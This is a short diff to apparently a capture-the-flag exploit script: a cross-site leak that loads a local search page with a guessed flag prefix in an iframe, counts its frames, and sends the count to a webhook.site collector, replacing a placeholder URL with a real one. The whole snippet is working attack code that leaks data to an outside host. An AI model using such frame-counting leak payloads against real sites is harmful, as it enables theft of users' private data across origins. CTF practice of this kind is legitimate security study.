@@ -9,10 +9,10 @@ const iframe = document.createElement("iframe");
 iframe.src = "http://127.0.0.1:8000/search?query=DH{";
 iframe.onload = () => {
   const len = iframe.contentWindow.length;
-  fetch("https://webhook.site/YOUR_WEBHOOK_B_URL?step=iframe_loaded&len=" + len);
+  fetch("https://webhook.site/8088a9e6-c7fe-4518-ad97-fa0c73431f5f?step=iframe_loaded&len=" + len);
 };
 iframe.onerror = () => {
-  fetch("https://webhook.site/YOUR_WEBHOOK_B_URL?step=iframe_error");
+  fetch("https://webhook.site/8088a9e6-c7fe-4518-ad97-fa0c73431f5f?step=iframe_error");
 };
 document.body.appendChild(iframe);
 </script>
